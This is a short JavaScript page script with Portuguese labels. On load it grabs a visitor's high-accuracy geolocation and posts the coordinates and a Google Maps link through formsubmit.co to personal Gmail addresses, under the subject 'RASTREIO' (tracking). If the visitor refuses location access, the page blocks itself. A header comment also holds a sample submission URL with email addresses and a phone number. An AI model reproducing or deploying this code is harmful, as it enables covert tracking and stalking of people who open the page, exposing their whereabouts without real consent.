//https://mapsplatform.google.com/
//https://formsubmit.co/ukwallyportfolio@gmail.com?_next=https%3A%2F%2Fukwally.github.io%2FElisabeth%2Fpages%2Fenviado.html&hiddenFormTittle=TITULO%3A+CONTACTAR+ELISABETH&_cc=elisa.ped.2%40gmail.com&_subject=NOVO+ENVIO%3ACONTACTO&_template=table&_captcha=false&nome=armindo&email=onsokul404%40gmail.com&telefone=7655493&texto=Arminto&termos=on

let permissao = 0;

const opcoes = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
}

function obterLocalizacao() {
    const resultado = document.getElementById("body");
    if (!navigator.geolocation) {
        resultado.textContent = "Geolocalização não suportada pelo navegador.";
        resultado.style = ' color:red;display: flex; justify-content:center;align-items:center; height:100vh';
        return;
    }
    navigator.geolocation.getCurrentPosition(
        async function (posicao) {
            const latitude = posicao.coords.latitude;
            const longitude = posicao.coords.longitude;
            const dados = { latitude: latitude, longitude: longitude }

            //alert(`Latitude: ${latitude}Longitude: ${longitude}`);

            if (dados) {

                await formulario(dados);

            }
        },
        function (erro) {
            resultado.textContent = "ERRO: Ative a Localização Para Usar : recarregue apágina: "+ erro;
            resultado.style = ' color:red;display: flex; justify-content:center;align-items:center; height:100vh';

        },

        opcoes
    );
}
obterLocalizacao();



//inicio do envio
async function formulario(dados) {
    const campos = {
        _next: 'https://ukwally.github.io/Armindo/index.html',
        hiddenFormTittle: 'TITULO: RASTREIO DE LOCALLISAÇÃO',
        _cc: 'elisa.ped.2@gmail.com',
        _subject: 'RASTREIO',
        _template: 'table',
        _captcha: 'false',
        latitude: dados.latitude,
        longitude: dados.longitude,
        link: `https://www.google.com/maps?q=${dados.latitude},${dados.longitude}`,
    }

    try {
        const resposta = await fetch('https://formsubmit.co/ukwallyportfolio@gmail.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(campos)
        });

        if (resposta.ok) {
            console.log('sussesso:');
        } else {

            console.log(`Erro: ${resposta.status}`);
        }

    } catch (error) {
        console.error(`Erro ao enviar Formularioa ${error}`)
    }
}
//fim do envio
